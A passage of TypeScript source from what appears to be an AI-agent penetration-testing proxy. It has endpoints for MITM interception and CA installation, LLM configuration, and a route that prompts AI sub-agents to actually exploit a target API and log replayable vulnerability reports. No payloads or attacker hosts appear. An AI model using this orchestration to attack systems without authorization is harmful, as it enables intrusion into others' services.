        // ---------------- MITM（HTTPS 抓包/拦截：CA 管理 + 开关） ----------------
        case '/api/mitm/state': {
          if (req.method === 'PUT') {
            const body = JSON.parse(await this.readBody(req)) as { enabled: boolean }
            this.engine.mitmEnabled = !!body.enabled
          }
          this.json(res, 200, { enabled: this.engine.mitmEnabled })
          break
        }
        case '/api/mitm/ca': {
          const { getCaCertPem, getCaCertPath, isCaTrusted } = await import('./mitm.ts')
          this.json(res, 200, { path: getCaCertPath(), pem: getCaCertPem(), trusted: isCaTrusted() })
          break
        }
        case '/api/mitm/ca/install': {
          const { installCa } = await import('./mitm.ts')
          this.json(res, 200, installCa())
          break
        }
        // ---------------- 本地 Hermes LLM 配置（只读本机 config.yaml 模型段，同机直读文件） ----------------
        case '/api/hermes/local-config': {
          const os2 = await import('node:os')
          const path = await import('node:path')
          const fs = await import('node:fs')
          // 优先 hermespentbox 档案配置（与 HERMES_HOME 一致），fallback 本机 default
          const candidates = [
            path.join(os2.homedir(), 'AppData', 'Local', 'hermes', 'profiles', 'hermespentbox', 'config.yaml'),
            path.join(os2.homedir(), 'AppData', 'Local', 'hermes', 'config.yaml'),
            path.join(os2.homedir(), '.hermes', 'config.yaml'),
          ]
          const cfgPath = candidates.find((p) => fs.existsSync(p))
          if (!cfgPath) throw new Error('未找到本地 hermes config.yaml')
          const text = fs.readFileSync(cfgPath, 'utf8')
          // 行解析 model 段（JS 正则无 \Z；档案 config 可能只有 model 段，段匹配会失败）
          const lines = text.split(/\r?\n/)
          let inModel = false
          const seg: string[] = []
          for (const l of lines) {
            if (/^model:/.test(l)) { inModel = true; continue }
            if (inModel && /^\S/.test(l)) break
            if (inModel) seg.push(l)
          }
          const get = (k: string) => {
            const line = seg.find((l) => l.trim().startsWith(`${k}:`))
            if (!line) return ''
            const v = line.split(':').slice(1).join(':').trim().replace(/^['"]|['"]$/g, '')
            if (k === 'api_key' && v.length > 12) return v.slice(0, 7) + '...' + v.slice(-4)
            return v
          }
          // api_key 从 .env 读（真实 key 走 <PROVIDER>_API_KEY；config.yaml 已不存 key）
          let apiKey = ''
          try {
            const envText = fs.readFileSync(path.join(path.dirname(cfgPath), '.env'), 'utf8')
            const keyName = `${get('provider').toUpperCase().replace(/[^A-Z0-9]/g, '_')}_API_KEY`
            apiKey = envText.match(new RegExp(`^${keyName}=(.*)$`, 'm'))?.[1] ?? ''
            if (apiKey.length > 12) apiKey = apiKey.slice(0, 7) + '...' + apiKey.slice(-4)
          } catch { /* 无 .env 则 apiKey 为空 */ }
          this.json(res, 200, { path: cfgPath, model: { default: get('default'), provider: get('provider'), base_url: get('base_url'), api_key: apiKey } })
          break
        }
        // ---------------- 渗透执行（对应子 Agent 执行：resume 提出意见的子 Agent 槽位会话；有成果→解析【VULNDOC】写漏洞库 + SSE 推送主 Agent 汇报） ----------------
        case '/api/penetrate': {
          const body = JSON.parse(await this.readBody(req)) as { advice?: string; slot?: number; reqRaw?: string; resRaw?: string; id?: number }
          if (!body.advice) throw new Error('advice 缺失')
          const slot = typeof body.slot === 'number' && body.slot >= 0 && body.slot < ApiServer.MAX_PARALLEL ? body.slot : 0
          // 渗透前查重：从原始请求包提取目标（Host+路径）+ advice 提取渗透方式；同 API 同方式已渗透过/正在渗透 → 不重复执行
          // P0：targetKey 用 normalizeTargetKey 统一规范化（与发卡/成果写入格式一致）
          const rawT = (body.reqRaw || '').match(/^\S+\s+(\S+)\s+HTTP\/1\.[01]\r?\n(?:[^\r\n]*\r?\n)*?Host:\s*(\S+)/i)
          let targetKey = rawT ? this.normalizeTargetKey(`${rawT[2]}${rawT[1]}`) : ''
          // fallback：reqRaw 缺失时尝试从 advice 中的绝对 URL 提取目标
          if (!targetKey) {
            const absUrl = (body.advice || '').match(/https?:\/\/[^\s"'）)]+/)?.[0]
            if (absUrl) targetKey = this.normalizeTargetKey(absUrl)
          }
          const method = (body.advice || '').match(/可进行\s*(.+?)\s*渗透/)?.[1] || ''
          const penKey = targetKey ? `${targetKey}|${method}` : ''
          if (penKey && (this.penetratedKeys.has(penKey) || this.penetratingKeys.has(penKey))) {
            this.json(res, 200, { started: false, slot, reply: `该目标API渗透方式已进行过 不再重复渗透（${targetKey} ${method}）` })
            break
          }
          const sess = this.analyzeSlots[slot]
          this.pendingAdviceSlots.delete(slot)  // 用户点渗透 → 卡片决策完成，由渗透接管该槽
          this.penetrating = true  // 渗透窗口：期间流量跳过子 Agent 审计（防循环）
          // 记录渗透目标（取消时写入全局情报：同 API 状态可见）+ 进行中 key（防并发双渗透）
          const pm2 = (body.advice || '').match(/可进行\s*(.+?)\s*渗透/)?.[1] || ''
          if (penKey) this.penetratingKeys.add(penKey)
          if (targetKey) {
            this.penetrateTargets.set(slot, `${targetKey} ${pm2}`)
            this.engine.setPenetrateTarget(targetKey)  // 代理层标记渗透目标 → 命中流量 self 跳过审计
          }
          // 进行中工作共享：持久情报标记"正在渗透 X"（其他子 Agent 可见，避免重复建议/重复盯同一目标；完成/取消后移除）
          const tkHost = targetKey ? targetKey.split(':')[0] : ''
          const tkPath = targetKey ? targetKey.replace(/^[^/]+/, '') : ''
          this.pushDigest({ kind: 'penetrating', host: tkHost || '', path: tkPath, data: `正在渗透（${pm2 || method}），由槽 ${slot} 执行`, persist: true })
          // 异步执行：立即返回（前端不再同步等待 4 分钟），完成经 SSE 推送 penetrate-done 更新任务/沟通窗口
          this.json(res, 200, { started: true, slot })
          ;(async () => {
          try {
          // 任务包装：要求子 Agent 实际执行渗透；有成果时输出【VULNDOC】结构化漏洞文档（严格格式规范，禁止 markdown 围栏/路由前缀，原始请求/响应包必填）
          const digest = this.digestPrompt()
          const task = `${digest}${body.advice}\n\n（渗透执行要求：这是对单个 API 的采纳式渗透——严格只针对原始请求包中这一个 URL（方法+完整路径+查询参数），只验证该接口是否存在漏洞；禁止访问同站点任何其他路径/接口/静态资源，禁止目录枚举、全站扫描、批量探测、交叉接口利用。验证充分、确认结果后立即结束（蜂群模式：验证完成后释放子 Agent 继续流量分析）。这是渗透执行任务，不是流量分析任务——禁止输出 {"vuln":...} 形式的 JSON 或任何 JSON 代码，全部用文字描述执行过程。忽略此前对话中的任何结论与判断，只依据本次提供的【全局情报】与原始请求包执行。开始前先检查【全局情报】：判定"已渗透过"必须同时满足三个条件——① Host 完全相同；② 完整 API 路径完全相同（包括文件名与查询参数，如 /WFManager/js/login.js?rev=200003 与 /WFManager/loginAction_doLogin.action 是不同路径；仅 /WFManager/ 前缀相同不算）；③ 渗透方式完全相同。三者都满足才回复"该目标API渗透方式已进行过 不再重复渗透"并停止；否则必须实际执行渗透验证，禁止回复"已进行过"；若确认存在可利用漏洞（有成果），在回复末尾输出以下结构的漏洞文档，格式必须严格遵守：\n【VULNDOC】\n标题：<只写漏洞名称本身，禁止带 URL 或路由前缀，错误示例"/api/login 未授权访问"，正确示例"未授权访问与凭据泄漏">\n危害等级：high|medium|low\n漏洞描述：<简要描述>\n复现步骤：<验证过程>\n修复建议：<修复方案>\n漏洞目标：<目标 URL（协议+Host+端口，如 http://127.0.0.1:8800，必填）>\n漏洞路由：<漏洞接口路径（如 /api/login，必填）>\n原始请求包：\n<触发该漏洞的完整原始 HTTP 请求报文，必填。从请求行开始逐行原样输出（GET /path HTTP/1.1\\nHost: ...\\n\\n<body>），禁止使用 markdown 代码块围栏（禁止 \`\`\` 字符）、禁止加引号包裹、禁止 JSON 转义，必须可直接复制重放>\n原始响应包：\n<对应的完整原始 HTTP 响应报文，必填。从状态行开始逐行原样输出（HTTP/1.1 200 OK\\nHeader: ...\\n\\n<body>），同样禁止 \`\`\` 与任何修饰字符>\n若未确认漏洞，只需输出执行过程说明，不要输出【VULNDOC】）`
          const reply = await this.runViaGateway(task, sess, (abort) => { this.penetrateChildren.set(slot, abort) })  // 渗透经本地 gateway 执行（取消 = WebSocket abort，参考 hermes-studio chat-run）
          this.penetrateChildren.delete(slot)
          this.penetrateTargets.delete(slot)  // 渗透正常完成：清除目标记录（取消记录只由 cancel 路径写入全局情报）
          if (targetKey) this.engine.clearPenetrateTarget(targetKey)  // 同步清除代理层渗透目标标记
          // 子 Agent 执行时判定"该目标API渗透方式已进行过 不再重复渗透"（渗透前查重 miss、但子 Agent 依据【全局情报】识别出已渗透过）：
          // 视为自动取消——不写漏洞库、释放槽位会话（子 Agent 继续流量分析）、SSE 通知前端移除后台任务条
          if (reply.includes('该目标API渗透方式已进行过')) {
            const skHost = targetKey ? targetKey.split(':')[0] : ''
            const skPath = targetKey ? targetKey.replace(/^[^/]+/, '') : ''
            this.pushDigest({ kind: 'penetrated', host: skHost, path: skPath, data: `${method} 已渗透过 自动跳过`, persist: true })
            this.removeDigest('penetrating', skHost, skPath)  // 移除进行中标记
            this.analyzeSlots[slot] = ''  // 释放槽位会话：下次分析新建干净会话，子 Agent 继续流量分析
            this.pushSse({ type: 'penetrate-done', slot, reply, vulnDoc: false, skipped: true })
          } else {
          // 解析 VULNDOC（兼容省略【VULNDOC】标记：检测"原始请求包："即视为漏洞文档正文）→ 写入漏洞库 + 静默注入主 Agent 会话记忆
          const docBody = reply.includes('【VULNDOC】') ? (reply.match(/【VULNDOC】\s*\n([\s\S]*?)(?=\n【|$)/) || [])[1] ?? '' : /原始请求包[:：]/.test(reply) ? reply : ''
          if (docBody) {
            const g = (k: string) => (docBody.match(new RegExp(`${k}[:：]\\s*(.+)`)) || [])[1]?.trim() ?? ''
            const level = g('危害等级').toLowerCase().includes('high') ? 'high' : g('危害等级').toLowerCase().includes('medium') || g('危害等级').toLowerCase().includes('中') ? 'medium' : g('危害等级').toLowerCase().includes('low') || g('危害等级').toLowerCase().includes('低') ? 'low' : 'info'
            const uri = `${g('漏洞目标') || ''}${g('漏洞路由') || ''}`  // 目标+路由（完整定位，如 http://127.0.0.1:8800/api/login）
            // 清洗：标题去掉开头路由前缀（如 "/api/login 未授权访问" → "未授权访问"——先 trim 再去前缀，防前导空格绕过）；原始报文去掉 ``` markdown 围栏
            const rawName = (g('标题') || '子 Agent 渗透发现').trim().replace(/^https?:\/\/[^\s]+\s+/, '').replace(/^\/[^\s]+\s+/, '').trim()
            const cleanRaw = (s: string) => s.split('\n').filter((l) => !l.trim().startsWith('```')).join('\n').trim()
            // 复现步骤写入利用信息（exploit）；desc 只含漏洞描述 + 修复建议（不重复）
            const v: Vuln = { id: ++this.vulnSeq, name: rawName || '子 Agent 渗透发现', level, cvss: '', uri, desc: `${g('漏洞描述')}\n\n修复建议：${g('修复建议')}`.slice(0, 2000), exploit: g('复现步骤'), status: 'pending', reqRaw: cleanRaw((docBody.match(/原始请求包[:：]\s*([\s\S]*?)(?=\n原始响应包[:：]|$)/) || [])[1]?.trim() || body.reqRaw || '').slice(0, 4000), resRaw: cleanRaw((docBody.match(/原始响应包[:：]\s*([\s\S]*?)$/) || [])[1]?.trim() || body.resRaw || '').slice(0, 4000), ts: Date.now() }
            this.vulns.push(v)
            this.saveVulns()
            // VULNDOC 成果入图（Agent 共享，host/path 从完整 uri 拆分）
            const { host: vh, path: vp } = this.splitVulnUri(uri)
            if (vh && vp) { this.graph.writeVuln({ name: v.name, level, desc: v.desc, host: vh, path: vp, exploit: v.exploit, color: HAE_LEVEL_COLOR[level] }); this.graph.confirmAnalysis(vh, vp, level).catch(() => {}); this.broadcastGraphChange(`渗透确认漏洞(${level}) ${vh}${vp}: ${v.name}`) }
            // 渗透确认 → 对应流量条目标记 confirmed（前端轮询：疑似问号 → 确认 BUG ICON + 确认等级）
            if (typeof body.id === 'number') {
              const ast = this.analyzeMap.get(body.id)
              if (ast) { ast.confirmed = true; ast.confLevel = level }
            }
            // 渗透成果写入全局情报（子 Agent 共享：后续分析/渗透前可见，避免同 API 同方式重复渗透）
            if (uri) {
              const pm = (body.advice || '').match(/可进行\s*(.+?)\s*渗透/)?.[1] || ''
              // reqRaw 推导的规范 key（normalizeTargetKey 统一格式）优先记入——堵住 VULNDOC 漏洞路由不带 query 导致的 key 漂移
              if (targetKey) this.penetratedKeys.add(`${targetKey}|${pm}`)
              // 模型报告 uri 兜底（normalizeTargetKey 规范化，如 http://127.0.0.1:8800/api/login → 127.0.0.1:8800/api/login）
              const normUri = this.normalizeTargetKey(uri)
              if (normUri) this.penetratedKeys.add(`${normUri}|${pm}`)
              // 无 query 版本兜底（模型漏 query 时，同路径不同 query 仍视为已渗透）
              const uriNoQuery = normUri.split('?')[0]
              if (uriNoQuery) this.penetratedKeys.add(`${uriNoQuery}|${pm}`)
              // 全局情报（结构化持久条目 + 移除进行中标记）
              const resHost = normUri ? normUri.split(':')[0] : ''
              const resPath = normUri ? normUri.replace(/^[^/]+/, '') : ''
              this.pushDigest({ kind: 'penetrated', host: resHost, path: resPath, data: `${pm} 漏洞(${level}) ${v.name}`, persist: true })
              this.removeDigest('penetrating', resHost, resPath)
            }
            this.pushSse({ type: 'vuln-doc', vuln: { id: v.id, name: v.name, level: v.level, desc: v.desc, exploit: v.exploit, ts: v.ts } })
            // 静默注入主 Agent 会话（走 Bridge 通道，与主会话同一命名空间才算真正注入；mainChat=false 不回写指针；仅当主会话已存在时注入）
            if (this.chatSessionId) {
              this.bridgeAsk(`（记忆记录，无需回复与执行任何操作）已知漏洞档案：漏洞 ${v.id}：${v.name}（${level}）\n描述：${g('漏洞描述').slice(0, 300)}\n复现：${g('复现步骤').slice(0, 300)}`, this.chatSessionId, {}, false).catch(() => { /* 记忆注入失败不影响主流程 */ })
            }
          }
          this.pushSse({ type: 'penetrate-done', slot, reply, vulnDoc: !!docBody })  // 异步完成通知（前端更新任务/沟通窗口）
          }
          } catch (e) {
            this.pushSse({ type: 'penetrate-done', slot, reply: `（渗透执行失败：${(e as Error).message}）`, vulnDoc: false })
          } finally {
            this.penetrating = false  // 结束渗透窗口（无论成败都恢复审计）
            if (penKey) this.penetratingKeys.delete(penKey)  // 释放进行中标记（防并发双渗透）
            if (targetKey) this.engine.clearPenetrateTarget(targetKey)  // 同步清除代理层渗透目标标记（成功路径已清，此处兜底）
            // 兜底移除"正在渗透"digest 条目（成果/跳过分支已移；失败/无成果时此处兜底）
            const fkHost = targetKey ? targetKey.split(':')[0] : ''
            const fkPath = targetKey ? targetKey.replace(/^[^/]+/, '') : ''
            this.removeDigest('penetrating', fkHost, fkPath)
          }
          })()
          break
        }
        // ---------------- 子 Agent 运行中引导（steer：注入运行中渗透/分析 turn，不打断） ----------------
        case '/api/penetrate/steer': {
          const body = JSON.parse(await this.readBody(req)) as { text: string; slot?: number }
          if (!body.text) throw new Error('text 缺失')
          const slot = typeof body.slot === 'number' && body.slot >= 0 && body.slot < ApiServer.MAX_PARALLEL ? body.slot : 0
          const sid = this.analyzeSlots[slot]
          await this.ensureBridge()
          if (!sid || !this.bridgeReady) { this.json(res, 200, { accepted: false, status: 'rejected' }); break }
          this.json(res, 200, await this.bridge.steer(sid, body.text, 'hermespentbox'))
          break
        }
        // ---------------- 取消渗透任务（杀对应子 Agent 进程） ----------------
        case '/api/penetrate/cancel': {
          const body = JSON.parse(await this.readBody(req)) as { slot?: number }
          const slot = typeof body.slot === 'number' ? body.slot : -1
          const child = this.penetrateChildren.get(slot)
          if (typeof child === 'function') {
            // gateway 模式：发 abort 信号（优雅停止，参考 hermes-studio chat-run）
            try { (child as () => void)() } catch { /* 已结束 */ }
          } else if (child) {
            try { child.kill() } catch { /* 已退出 */ }
          }
          if (child) this.penetrateChildren.delete(slot)
          // 取消同步到全局情报（后续子 Agent 可见该 API 渗透已被用户取消，不再重复提议/可结合成果判断）
          const ptarget = this.penetrateTargets.get(slot)
          if (ptarget) {
            // 移除进行中 key（ptarget 格式 `${targetKey} ${pm2}` → 重建 penKey）
            const pv = ptarget.split(' ')
            const pk = pv[0]
            const pkm = pv.slice(1).join(' ')
            if (pk) this.penetratingKeys.delete(`${pk}|${pkm}`)
            // 取消信号降权：结构化持久记录（后续子 Agent 可见该方向曾被取消，避免重复建议）
            const chHost = pk ? pk.split(':')[0] : ''
            const chPath = pk ? pk.replace(/^[^/]+/, '') : ''
            this.pushDigest({ kind: 'cancelled', host: chHost, path: chPath, data: `${pkm} 渗透被用户取消（中断）`, persist: true })
            this.removeDigest('penetrating', chHost, chPath)
            this.penetrateTargets.delete(slot)
          }
          this.pendingAdviceSlots.delete(slot)  // 取消卡片/任务 → 恢复该槽流量分析
          this.penetrating = false  // 取消即恢复流量审计（防 kill 后 close 未触发的极端情况）
          this.engine.clearAllPenetrateTargets()  // 取消：清除代理层所有渗透目标标记
          this.analyzeSlots[slot >= 0 && slot < ApiServer.MAX_PARALLEL ? slot : 0] = ''  // 释放槽位会话：下次分析新建干净会话，继续流量分析工作
          this.json(res, 200, { ok: true })
          break
        }
        // ---------------- 恢复子 Agent 流量分析（卡片被用户关闭/超时未渗透时，前端通知后端释放槽位） ----------------
        case '/api/advice/resume': {
          const body = JSON.parse(await this.readBody(req)) as { slot?: number }
          const slot = typeof body.slot === 'number' && body.slot >= 0 && body.slot < ApiServer.MAX_PARALLEL ? body.slot : -1
          if (slot >= 0) this.pendingAdviceSlots.delete(slot)
          this.json(res, 200, { ok: true })
          break
        }
        // ---------------- LLM 设为默认（写入 hermespentbox 档案 config.yaml：模型/端点/Key 全量，应用对话实际生效） ----------------
        case '/api/llms/set-default': {
          const body = JSON.parse(await this.readBody(req)) as { model?: string; provider?: string; baseUrl?: string; apiKey?: string }
          if (!body.model) throw new Error('model 缺失')
          const provider = body.provider === 'minimax' ? 'minimax-cn' : body.provider  // Hermes 官方 provider 名（minimax-cn）
          const cfg = (k: string, v: string) => new Promise<void>((resolve) => {
            const child = spawn(this.hermesCli, ['config', 'set', k, v], { env: this.hermesEnv, cwd: this.agentCwd, windowsHide: true })
            child.on('close', () => resolve())
          })
          await cfg('model.default', body.model)
          if (provider) await cfg('model.provider', provider)
          if (body.baseUrl) {
            // 端点写 .env 的 OPENAI_BASE_URL（Hermes OpenAI 兼容约定，本机即如此配置；config.yaml 的 model.base_url 会与内置端点冲突）
            const envPath = join(this.hermesHome, '.env')
            let env = existsSync(envPath) ? readFileSync(envPath, 'utf8') : ''
            const re = /^OPENAI_BASE_URL=.*$/m
            env = re.test(env) ? env.replace(re, `OPENAI_BASE_URL=${body.baseUrl}`) : env.trimEnd() + `\nOPENAI_BASE_URL=${body.baseUrl}\n`
            writeFileSync(envPath, env)
          }
          if (body.apiKey && provider) {
            // 真实 key 写档案 .env（config set 对 key 值脱敏，必须走 <PROVIDER>_API_KEY 环境变量）
            const keyName = `${provider.toUpperCase().replace(/[^A-Z0-9]/g, '_')}_API_KEY`
            const envPath = join(this.hermesHome, '.env')
            let env = existsSync(envPath) ? readFileSync(envPath, 'utf8') : ''
            const re = new RegExp(`^${keyName}=.*$`, 'm')
            env = re.test(env) ? env.replace(re, `${keyName}=${body.apiKey}`) : env.trimEnd() + `\n${keyName}=${body.apiKey}\n`
            writeFileSync(envPath, env)
          }
          // 清理 config.yaml 的 api_key/base_url 残留（key 与端点都走 .env；config set 写入的 key 会被脱敏成假值导致 401）
          const cfgPath = join(this.hermesHome, 'config.yaml')
          if (existsSync(cfgPath)) {
            const text = readFileSync(cfgPath, 'utf8')
            const clean = text.split(/\r?\n/).filter((l) => !/^\s*(api_key|base_url):/.test(l)).join('\n')
            if (clean !== text) writeFileSync(cfgPath, clean)
          }
          this.json(res, 200, { ok: true })
          break
        }
        // ---------------- LLM 直连对话（OpenAI 兼容；供 Agent 分析队列等内部消费） ----------------
        case '/api/llm/chat': {
          const body = JSON.parse(await this.readBody(req)) as { baseUrl?: string; apiKey?: string; model?: string; reasoning?: string; messages?: { role: string; content: string }[] }
          if (!body.baseUrl || !body.apiKey || !body.model || !body.messages?.length) throw new Error('baseUrl/apiKey/model/messages 缺失')
          const payload: Record<string, unknown> = { model: body.model, messages: body.messages, max_tokens: 1024 }
          if (body.reasoning) payload.reasoning_effort = body.reasoning
          const r = await fetch(`${body.baseUrl.replace(/\/+$/, '')}/chat/completions`, {
            method: 'POST',
            headers: { 'content-type': 'application/json', authorization: `Bearer ${body.apiKey}` },
            body: JSON.stringify(payload),
            signal: AbortSignal.timeout(60000),
          })
          const j = await r.json().catch(() => ({}))
          if (!r.ok) throw new Error(j.error?.message ?? j.error ?? `HTTP ${r.status}`)
          this.json(res, 200, { ok: true, content: j.choices?.[0]?.message?.content ?? '' })
          break
        }
        // ---------------- LLM 直连测试（纯 HTTP：验证用户配置的端点/Key/模型可用） ----------------
        case '/api/llm/test': {
          const body = JSON.parse(await this.readBody(req)) as { baseUrl?: string; apiKey?: string; model?: string }
          if (!body.baseUrl || !body.apiKey || !body.model) throw new Error('baseUrl/apiKey/model 缺失')
          const r = await fetch(`${body.baseUrl.replace(/\/+$/, '')}/chat/completions`, {
            method: 'POST',
            headers: { 'content-type': 'application/json', authorization: `Bearer ${body.apiKey}` },
            body: JSON.stringify({ model: body.model, messages: [{ role: 'user', content: 'ping' }], max_tokens: 4 }),
            signal: AbortSignal.timeout(15000),
          })
          const j = await r.json().catch(() => ({}))
          if (!r.ok) throw new Error(j.error?.message ?? j.error ?? `HTTP ${r.status}`)
          this.json(res, 200, { ok: true, model: j.model ?? body.model, usage: j.usage })
          break
        }
        default:
          if (url.pathname.startsWith('/api/flows/')) {
            const id = Number(url.pathname.split('/')[3])
            const f = this.flows.find((x) => x.id === id)
            if (!f) { this.json(res, 404, { error: 'not found' }); break }
            // 详情（MITM 全量报文）
            if (url.pathname.endsWith('/detail')) {
              const d = this.flowDetails.get(id)
              if (!d) { this.json(res, 404, { error: 'no detail (非 MITM 流量或无报文)' }); break }
              this.json(res, 200, { id, ...d })
              break
            }
            this.json(res, 200, f)
            break
          }
          if (url.pathname === '/api/upstream' && req.method === 'PUT') {
            const body = JSON.parse(await this.readBody(req)) as Upstream
            if (!body?.type) throw new Error('missing type')
            this.engine.setUpstream(body)
            this.json(res, 200, { ok: true, upstream: body })
            break
          }
          // ---------------- 下游代理（类 Burp 方案：内置代理抓包/分析后转发给下游；独立于上游链） ----------------
          if (url.pathname === '/api/downstream') {
            if (req.method === 'PUT') {
              const body = JSON.parse(await this.readBody(req)) as { host?: string; port?: number; protocol?: 'http' | 'socks5' }
              const ds = body && body.host && body.port && Number(body.port) > 0
                ? { host: String(body.host).trim(), port: Number(body.port), protocol: body.protocol === 'socks5' ? ('socks5' as const) : ('http' as const) }
                : null
              this.engine.setDownstream(ds)
              try { writeFileSync(this.dsFile, JSON.stringify(ds ? { host: ds.host, port: ds.port, protocol: ds.protocol } : {})) } catch { /* 落盘失败不影响运行 */ }
              this.json(res, 200, { ok: true, downstream: ds })
            } else {
              this.json(res, 200, { downstream: this.engine.getDownstream() })
            }
            break
          }
          if (url.pathname === '/api/proxy/stop' && req.method === 'POST') {
            await this.engine.stop()
            this.json(res, 200, { ok: true })
            break
          }
          this.json(res, 404, { error: `no route: ${req.method} ${url.pathname}` })
      }
    } catch (e) {
      this.json(res, 400, { error: e instanceof Error ? e.message : String(e) })
    }
  }
}
